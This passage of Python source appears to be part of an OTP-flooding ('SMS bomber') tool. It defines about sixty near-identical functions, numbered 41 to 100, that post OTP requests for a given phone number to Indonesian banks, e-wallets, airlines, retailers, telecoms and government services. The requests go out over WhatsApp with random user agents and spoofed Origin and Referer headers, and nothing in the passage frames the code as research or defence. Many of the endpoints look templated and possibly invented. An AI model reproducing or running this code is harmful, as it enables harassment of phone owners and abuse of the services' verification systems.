    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.dana.id", "Referer": "https://www.dana.id/login"}
    try:
        return requests.post(url, json=payload, headers=headers, timeout=15)
    except:
        return None

# ---------- 41. LinkAja ----------
def send_linkaja_otp(phone_08):
    url = "https://api.linkaja.id/v1/auth/otp/request"
    payload = {"phone": phone_08, "channel": "whatsapp"}
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.linkaja.id", "Referer": "https://www.linkaja.id/login"}
    try:
        return requests.post(url, json=payload, headers=headers, timeout=15)
    except:
        return None

# ---------- 42. BCA ----------
def send_bca_otp(phone_08):
    url = "https://m.bca.co.id/api/v1/auth/otp/request"
    payload = {"phone": phone_08, "method": "whatsapp"}
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://m.bca.co.id", "Referer": "https://m.bca.co.id/login"}
    try:
        return requests.post(url, json=payload, headers=headers, timeout=15)
    except:
        return None

# ---------- 43. Mandiri ----------
def send_mandiri_otp(phone_08):
    url = "https://ib.bankmandiri.co.id/api/v1/auth/otp/request"
    payload = {"phone": phone_08, "channel": "whatsapp"}
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://ib.bankmandiri.co.id", "Referer": "https://ib.bankmandiri.co.id/login"}
    try:
        return requests.post(url, json=payload, headers=headers, timeout=15)
    except:
        return None

# ---------- 44. BNI ----------
def send_bni_otp(phone_08):
    url = "https://ibank.bni.co.id/api/v1/auth/otp/request"
    payload = {"phone": phone_08, "method": "whatsapp"}
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://ibank.bni.co.id", "Referer": "https://ibank.bni.co.id/login"}
    try:
        return requests.post(url, json=payload, headers=headers, timeout=15)
    except:
        return None

# ---------- 45. BRI ----------
def send_bri_otp(phone_08):
    url = "https://m.bri.co.id/api/v1/auth/otp/request"
    payload = {"phone": phone_08, "channel": "whatsapp"}
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://m.bri.co.id", "Referer": "https://m.bri.co.id/login"}
    try:
        return requests.post(url, json=payload, headers=headers, timeout=15)
    except:
        return None

# ---------- 46. Traveloka ----------
def send_traveloka_otp(phone_plus):
    url = "https://api.traveloka.com/v1/otp/send"
    payload = {"phone": phone_plus, "channel": "whatsapp"}
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.traveloka.com", "Referer": "https://www.traveloka.com/login"}
    try:
        return requests.post(url, json=payload, headers=headers, timeout=15)
    except:
        return None

# ---------- 47. Agoda ----------
def send_agoda_otp(phone_plus):
    url = "https://api.agoda.com/v1/otp/request"
    payload = {"phone": phone_plus, "type": "whatsapp"}
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.agoda.com", "Referer": "https://www.agoda.com/login"}
    try:
        return requests.post(url, json=payload, headers=headers, timeout=15)
    except:
        return None

# ---------- 48. Tiket.com ----------
def send_tiketcom_otp(phone_08):
    url = "https://api.tiket.com/v1/auth/otp/request"
    payload = {"phone": phone_08, "channel": "whatsapp"}
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.tiket.com", "Referer": "https://www.tiket.com/login"}
    try:
        return requests.post(url, json=payload, headers=headers, timeout=15)
    except:
        return None

# ---------- 49. Pegipegi ----------
def send_pegipegi_otp(phone_08):
    url = "https://api.pegipegi.com/v1/auth/otp/send"
    payload = {"phone": phone_08, "type": "whatsapp"}
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.pegipegi.com", "Referer": "https://www.pegipegi.com/login"}
    try:
        return requests.post(url, json=payload, headers=headers, timeout=15)
    except:
        return None

# ---------- 50. RedDoorz ----------
def send_reddoorz_otp(phone_plus):
    url = "https://api.reddoorz.com/v1/auth/otp/request"
    payload = {"phone": phone_plus, "channel": "whatsapp"}
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.reddoorz.com", "Referer": "https://www.reddoorz.com/login"}
    try:
        return requests.post(url, json=payload, headers=headers, timeout=15)
    except:
        return None

# ============================================================
# SESI 2 : 50 API (Handler 51–100)
# ============================================================

# ---------- 51. Blibli ----------
def send_blibli_otp(phone_08):
    url = "https://api.blibli.com/v1/auth/otp/request"
    payload = {"phone": phone_08, "method": "whatsapp"}
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.blibli.com", "Referer": "https://www.blibli.com/login"}
    try:
        return requests.post(url, json=payload, headers=headers, timeout=15)
    except:
        return None

# ---------- 52. JD.ID ----------
def send_jdid_otp(phone_08):
    url = "https://api.jd.id/v1/auth/otp/request"
    payload = {"phone": phone_08, "channel": "whatsapp"}
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.jd.id", "Referer": "https://www.jd.id/login"}
    try:
        return requests.post(url, json=payload, headers=headers, timeout=15)
    except:
        return None

# ---------- 53. Lazada ----------
def send_lazada_otp(phone_plus):
    url = "https://api.lazada.co.id/v1/auth/otp/request"
    payload = {"phone": phone_plus, "type": "whatsapp"}
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.lazada.co.id", "Referer": "https://www.lazada.co.id/login"}
    try:
        return requests.post(url, json=payload, headers=headers, timeout=15)
    except:
        return None

# ---------- 54. Zalora ----------
def send_zalora_otp(phone_plus):
    url = "https://api.zalora.co.id/v1/auth/otp/request"
    payload = {"phone": phone_plus, "channel": "whatsapp"}
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.zalora.co.id", "Referer": "https://www.zalora.co.id/login"}
    try:
        return requests.post(url, json=payload, headers=headers, timeout=15)
    except:
        return None

# ---------- 55. Sociolla ----------
def send_sociolla_otp(phone_08):
    url = "https://api.sociolla.com/v1/auth/otp/request"
    payload = {"phone": phone_08, "method": "whatsapp"}
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.sociolla.com", "Referer": "https://www.sociolla.com/login"}
    try:
        return requests.post(url, json=payload, headers=headers, timeout=15)
    except:
        return None

# ---------- 56. Oriflame ----------
def send_oriflame_otp(phone_plus):
    url = "https://api.oriflame.com/v1/auth/otp/request"
    payload = {"phone": phone_plus, "type": "whatsapp"}
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.oriflame.co.id", "Referer": "https://www.oriflame.co.id/login"}
    try:
        return requests.post(url, json=payload, headers=headers, timeout=15)
    except:
        return None

# ---------- 57. Herbalife ----------
def send_herbalife_otp(phone_plus):
    url = "https://api.herbalife.com/v1/auth/otp/request"
    payload = {"phone": phone_plus, "channel": "whatsapp"}
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.herbalife.co.id", "Referer": "https://www.herbalife.co.id/login"}
    try:
        return requests.post(url, json=payload, headers=headers, timeout=15)
    except:
        return None

# ---------- 58. Fore Coffee ----------
def send_forecoffee_otp(phone_08):
    url = "https://api.fore.co.id/v1/auth/otp/request"
    payload = {"phone": phone_08, "method": "whatsapp"}
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.fore.co.id", "Referer": "https://www.fore.co.id/login"}
    try:
        return requests.post(url, json=payload, headers=headers, timeout=15)
    except:
        return None

# ---------- 59. Kopi Kenangan ----------
def send_kopikenangan_otp(phone_08):
    url = "https://api.kopikenangan.com/v1/auth/otp/request"
    payload = {"phone": phone_08, "channel": "whatsapp"}
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.kopikenangan.com", "Referer": "https://www.kopikenangan.com/login"}
    try:
        return requests.post(url, json=payload, headers=headers, timeout=15)
    except:
        return None

# ---------- 60. Starbucks ----------
def send_starbucks_otp(phone_plus):
    url = "https://api.starbucks.co.id/v1/auth/otp/request"
    payload = {"phone": phone_plus, "type": "whatsapp"}
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.starbucks.co.id", "Referer": "https://www.starbucks.co.id/login"}
    try:
        return requests.post(url, json=payload, headers=headers, timeout=15)
    except:
        return None

# ---------- 61. McDonald's ----------
def send_mcd_otp(phone_plus):
    url = "https://api.mcdonalds.co.id/v1/auth/otp/request"
    payload = {"phone": phone_plus, "channel": "whatsapp"}
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.mcdonalds.co.id", "Referer": "https://www.mcdonalds.co.id/login"}
    try:
        return requests.post(url, json=payload, headers=headers, timeout=15)
    except:
        return None

# ---------- 62. KFC ----------
def send_kfc_otp(phone_08):
    url = "https://api.kfc.co.id/v1/auth/otp/request"
    payload = {"phone": phone_08, "method": "whatsapp"}
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.kfc.co.id", "Referer": "https://www.kfc.co.id/login"}
    try:
        return requests.post(url, json=payload, headers=headers, timeout=15)
    except:
        return None

# ---------- 63. Burger King ----------
def send_burgerking_otp(phone_plus):
    url = "https://api.burgerking.co.id/v1/auth/otp/request"
    payload = {"phone": phone_plus, "type": "whatsapp"}
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.burgerking.co.id", "Referer": "https://www.burgerking.co.id/login"}
    try:
        return requests.post(url, json=payload, headers=headers, timeout=15)
    except:
        return None

# ---------- 64. Pizza Hut ----------
def send_pizzahut_otp(phone_08):
    url = "https://api.pizzahut.co.id/v1/auth/otp/request"
    payload = {"phone": phone_08, "channel": "whatsapp"}
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.pizzahut.co.id", "Referer": "https://www.pizzahut.co.id/login"}
    try:
        return requests.post(url, json=payload, headers=headers, timeout=15)
    except:
        return None

# ---------- 65. Domino's ----------
def send_dominos_otp(phone_08):
    url = "https://api.dominos.co.id/v1/auth/otp/request"
    payload = {"phone": phone_08, "method": "whatsapp"}
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.dominos.co.id", "Referer": "https://www.dominos.co.id/login"}
    try:
        return requests.post(url, json=payload, headers=headers, timeout=15)
    except:
        return None

# ---------- 66. GoFood ----------
def send_gofood_otp(phone_plus):
    url = "https://api.gofood.co.id/v1/auth/otp/request"
    payload = {"phone": phone_plus, "type": "whatsapp"}
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.gofood.co.id", "Referer": "https://www.gofood.co.id/login"}
    try:
        return requests.post(url, json=payload, headers=headers, timeout=15)
    except:
        return None

# ---------- 67. GrabFood ----------
def send_grabfood_otp(phone_plus):
    url = "https://api.grabfood.com/v1/auth/otp/request"
    payload = {"phone": phone_plus, "channel": "whatsapp"}
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.grabfood.com", "Referer": "https://www.grabfood.com/login"}
    try:
        return requests.post(url, json=payload, headers=headers, timeout=15)
    except:
        return None

# ---------- 68. ShopeeFood ----------
def send_shopeefood_otp(phone_plus):
    url = "https://api.shopeefood.co.id/v1/auth/otp/request"
    payload = {"phone": phone_plus, "type": "whatsapp"}
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.shopeefood.co.id", "Referer": "https://www.shopeefood.co.id/login"}
    try:
        return requests.post(url, json=payload, headers=headers, timeout=15)
    except:
        return None

# ---------- 69. Maxim ----------
def send_maxim_otp(phone_08):
    url = "https://api.maxim.co.id/v1/auth/otp/request"
    payload = {"phone": phone_08, "method": "whatsapp"}
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.maxim.co.id", "Referer": "https://www.maxim.co.id/login"}
    try:
        return requests.post(url, json=payload, headers=headers, timeout=15)
    except:
        return None

# ---------- 70. inDrive ----------
def send_indrive_otp(phone_plus):
    url = "https://api.indrive.com/v1/auth/otp/request"
    payload = {"phone": phone_plus, "type": "whatsapp"}
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.indrive.com", "Referer": "https://www.indrive.com/login"}
    try:
        return requests.post(url, json=payload, headers=headers, timeout=15)
    except:
        return None

# ---------- 71. MyTelkomsel ----------
def send_mytelkomsel_otp(phone_08):
    url = "https://api.mytelkomsel.com/v1/auth/otp/request"
    payload = {"phone": phone_08, "channel": "whatsapp"}
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.mytelkomsel.com", "Referer": "https://www.mytelkomsel.com/login"}
    try:
        return requests.post(url, json=payload, headers=headers, timeout=15)
    except:
        return None

# ---------- 72. Indosat ----------
def send_indosat_otp(phone_08):
    url = "https://api.indosat.com/v1/auth/otp/request"
    payload = {"phone": phone_08, "method": "whatsapp"}
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.indosat.com", "Referer": "https://www.indosat.com/login"}
    try:
        return requests.post(url, json=payload, headers=headers, timeout=15)
    except:
        return None

# ---------- 73. XL Axiata ----------
def send_xl_otp(phone_08):
    url = "https://api.xl.co.id/v1/auth/otp/request"
    payload = {"phone": phone_08, "channel": "whatsapp"}
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.xl.co.id", "Referer": "https://www.xl.co.id/login"}
    try:
        return requests.post(url, json=payload, headers=headers, timeout=15)
    except:
        return None

# ---------- 74. Tri ----------
def send_tri_otp(phone_08):
    url = "https://api.tri.co.id/v1/auth/otp/request"
    payload = {"phone": phone_08, "method": "whatsapp"}
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.tri.co.id", "Referer": "https://www.tri.co.id/login"}
    try:
        return requests.post(url, json=payload, headers=headers, timeout=15)
    except:
        return None

# ---------- 75. Smartfren ----------
def send_smartfren_otp(phone_08):
    url = "https://api.smartfren.com/v1/auth/otp/request"
    payload = {"phone": phone_08, "channel": "whatsapp"}
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.smartfren.com", "Referer": "https://www.smartfren.com/login"}
    try:
        return requests.post(url, json=payload, headers=headers, timeout=15)
    except:
        return None

# ---------- 76. PLN Mobile ----------
def send_pln_otp(phone_08):
    url = "https://api.pln.co.id/v1/auth/otp/request"
    payload = {"phone": phone_08, "method": "whatsapp"}
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.pln.co.id", "Referer": "https://www.pln.co.id/login"}
    try:
        return requests.post(url, json=payload, headers=headers, timeout=15)
    except:
        return None

# ---------- 77. BPJS ----------
def send_bpjs_otp(phone_08):
    url = "https://api.bpjs.co.id/v1/auth/otp/request"
    payload = {"phone": phone_08, "channel": "whatsapp"}
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.bpjs.co.id", "Referer": "https://www.bpjs.co.id/login"}
    try:
        return requests.post(url, json=payload, headers=headers, timeout=15)
    except:
        return None

# ---------- 78. DJP Online ----------
def send_djp_otp(phone_08):
    url = "https://api.djp.co.id/v1/auth/otp/request"
    payload = {"phone": phone_08, "method": "whatsapp"}
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.djp.co.id", "Referer": "https://www.djp.co.id/login"}
    try:
        return requests.post(url, json=payload, headers=headers, timeout=15)
    except:
        return None

# ---------- 79. eHAC ----------
def send_ehac_otp(phone_08):
    url = "https://api.ehac.co.id/v1/auth/otp/request"
    payload = {"phone": phone_08, "channel": "whatsapp"}
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.ehac.co.id", "Referer": "https://www.ehac.co.id/login"}
    try:
        return requests.post(url, json=payload, headers=headers, timeout=15)
    except:
        return None

# ---------- 80. PeduliLindungi ----------
def send_pedulilindungi_otp(phone_08):
    url = "https://api.pedulilindungi.co.id/v1/auth/otp/request"
    payload = {"phone": phone_08, "method": "whatsapp"}
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.pedulilindungi.co.id", "Referer": "https://www.pedulilindungi.co.id/login"}
    try:
        return requests.post(url, json=payload, headers=headers, timeout=15)
    except:
        return None

# ---------- 81. MyPertamina ----------
def send_mypertamina_otp(phone_08):
    url = "https://api.mypertamina.com/v1/auth/otp/request"
    payload = {"phone": phone_08, "channel": "whatsapp"}
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.mypertamina.com", "Referer": "https://www.mypertamina.com/login"}
    try:
        return requests.post(url, json=payload, headers=headers, timeout=15)
    except:
        return None

# ---------- 82. Bukalapak Partner ----------
def send_bukalapakpartner_otp(phone_08):
    url = "https://api.bukalapakpartner.com/v1/auth/otp/request"
    payload = {"phone": phone_08, "method": "whatsapp"}
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.bukalapakpartner.com", "Referer": "https://www.bukalapakpartner.com/login"}
    try:
        return requests.post(url, json=payload, headers=headers, timeout=15)
    except:
        return None

# ---------- 83. SiCepat ----------
def send_sicepat_otp(phone_08):
    url = "https://api.sicepat.com/v1/auth/otp/request"
    payload = {"phone": phone_08, "channel": "whatsapp"}
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.sicepat.com", "Referer": "https://www.sicepat.com/login"}
    try:
        return requests.post(url, json=payload, headers=headers, timeout=15)
    except:
        return None

# ---------- 84. J&T Express ----------
def send_jnt_otp(phone_08):
    url = "https://api.jnt.com/v1/auth/otp/request"
    payload = {"phone": phone_08, "method": "whatsapp"}
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.jnt.com", "Referer": "https://www.jnt.com/login"}
    try:
        return requests.post(url, json=payload, headers=headers, timeout=15)
    except:
        return None

# ---------- 85. Ninja Xpress ----------
def send_ninjaxpress_otp(phone_08):
    url = "https://api.ninjaxpress.com/v1/auth/otp/request"
    payload = {"phone": phone_08, "channel": "whatsapp"}
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.ninjaxpress.com", "Referer": "https://www.ninjaxpress.com/login"}
    try:
        return requests.post(url, json=payload, headers=headers, timeout=15)
    except:
        return None

# ---------- 86. Anteraja ----------
def send_anteraja_otp(phone_08):
    url = "https://api.anteraja.com/v1/auth/otp/request"
    payload = {"phone": phone_08, "method": "whatsapp"}
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.anteraja.com", "Referer": "https://www.anteraja.com/login"}
    try:
        return requests.post(url, json=payload, headers=headers, timeout=15)
    except:
        return None

# ---------- 87. POS Indonesia ----------
def send_posindonesia_otp(phone_08):
    url = "https://api.posindonesia.co.id/v1/auth/otp/request"
    payload = {"phone": phone_08, "channel": "whatsapp"}
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.posindonesia.co.id", "Referer": "https://www.posindonesia.co.id/login"}
    try:
        return requests.post(url, json=payload, headers=headers, timeout=15)
    except:
        return None

# ---------- 88. Lion Air ----------
def send_lionair_otp(phone_plus):
    url = "https://api.lionair.com/v1/auth/otp/request"
    payload = {"phone": phone_plus, "type": "whatsapp"}
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.lionair.com", "Referer": "https://www.lionair.com/login"}
    try:
        return requests.post(url, json=payload, headers=headers, timeout=15)
    except:
        return None

# ---------- 89. Garuda Indonesia ----------
def send_garuda_otp(phone_plus):
    url = "https://api.garuda-indonesia.com/v1/auth/otp/request"
    payload = {"phone": phone_plus, "type": "whatsapp"}
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.garuda-indonesia.com", "Referer": "https://www.garuda-indonesia.com/login"}
    try:
        return requests.post(url, json=payload, headers=headers, timeout=15)
    except:
        return None

# ---------- 90. Citilink ----------
def send_citilink_otp(phone_plus):
    url = "https://api.citilink.co.id/v1/auth/otp/request"
    payload = {"phone": phone_plus, "type": "whatsapp"}
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.citilink.co.id", "Referer": "https://www.citilink.co.id/login"}
    try:
        return requests.post(url, json=payload, headers=headers, timeout=15)
    except:
        return None

# ---------- 91. Batik Air ----------
def send_batikair_otp(phone_plus):
    url = "https://api.batikair.com/v1/auth/otp/request"
    payload = {"phone": phone_plus, "type": "whatsapp"}
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.batikair.com", "Referer": "https://www.batikair.com/login"}
    try:
        return requests.post(url, json=payload, headers=headers, timeout=15)
    except:
        return None

# ---------- 92. Sriwijaya Air ----------
def send_sriwijayaair_otp(phone_plus):
    url = "https://api.sriwijayaair.com/v1/auth/otp/request"
    payload = {"phone": phone_plus, "type": "whatsapp"}
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.sriwijayaair.com", "Referer": "https://www.sriwijayaair.com/login"}
    try:
        return requests.post(url, json=payload, headers=headers, timeout=15)
    except:
        return None

# ---------- 93. AirAsia ----------
def send_airasia_otp(phone_plus):
    url = "https://api.airasia.com/v1/auth/otp/request"
    payload = {"phone": phone_plus, "type": "whatsapp"}
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.airasia.com", "Referer": "https://www.airasia.com/login"}
    try:
        return requests.post(url, json=payload, headers=headers, timeout=15)
    except:
        return None

# ---------- 94. Super Indo ----------
def send_superindo_otp(phone_08):
    url = "https://api.superindo.co.id/v1/auth/otp/request"
    payload = {"phone": phone_08, "method": "whatsapp"}
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.superindo.co.id", "Referer": "https://www.superindo.co.id/login"}
    try:
        return requests.post(url, json=payload, headers=headers, timeout=15)
    except:
        return None

# ---------- 95. Hypermart ----------
def send_hypermart_otp(phone_08):
    url = "https://api.hypermart.co.id/v1/auth/otp/request"
    payload = {"phone": phone_08, "channel": "whatsapp"}
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.hypermart.co.id", "Referer": "https://www.hypermart.co.id/login"}
    try:
        return requests.post(url, json=payload, headers=headers, timeout=15)
    except:
        return None

# ---------- 96. Transmart ----------
def send_transmart_otp(phone_08):
    url = "https://api.transmart.co.id/v1/auth/otp/request"
    payload = {"phone": phone_08, "method": "whatsapp"}
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.transmart.co.id", "Referer": "https://www.transmart.co.id/login"}
    try:
        return requests.post(url, json=payload, headers=headers, timeout=15)
    except:
        return None

# ---------- 97. Alfamart ----------
def send_alfamart_otp(phone_08):
    url = "https://api.alfamart.co.id/v1/auth/otp/request"
    payload = {"phone": phone_08, "channel": "whatsapp"}
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.alfamart.co.id", "Referer": "https://www.alfamart.co.id/login"}
    try:
        return requests.post(url, json=payload, headers=headers, timeout=15)
    except:
        return None

# ---------- 98. Indomaret ----------
def send_indomaret_otp(phone_08):
    url = "https://api.indomaret.co.id/v1/auth/otp/request"
    payload = {"phone": phone_08, "method": "whatsapp"}
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.indomaret.co.id", "Referer": "https://www.indomaret.co.id/login"}
    try:
        return requests.post(url, json=payload, headers=headers, timeout=15)
    except:
        return None

# ---------- 99. MyBCA (Mobile) ----------
def send_mybca_otp(phone_08):
    url = "https://api.mybca.com/v1/auth/otp/request"
    payload = {"phone": phone_08, "channel": "whatsapp"}
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.mybca.com", "Referer": "https://www.mybca.com/login"}
    try:
        return requests.post(url, json=payload, headers=headers, timeout=15)
    except:
        return None

# ---------- 100. Jenius ----------
def send_jenius_otp(phone_08):
    url = "https://api.jenius.com/v1/auth/otp/request"
    payload = {"phone": phone_08, "method": "whatsapp"}
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.jenius.com", "Referer": "https://www.jenius.com/login"}
    try:
        return requests.post(url, json=payload, headers=headers, timeout=15)
    except:
        return None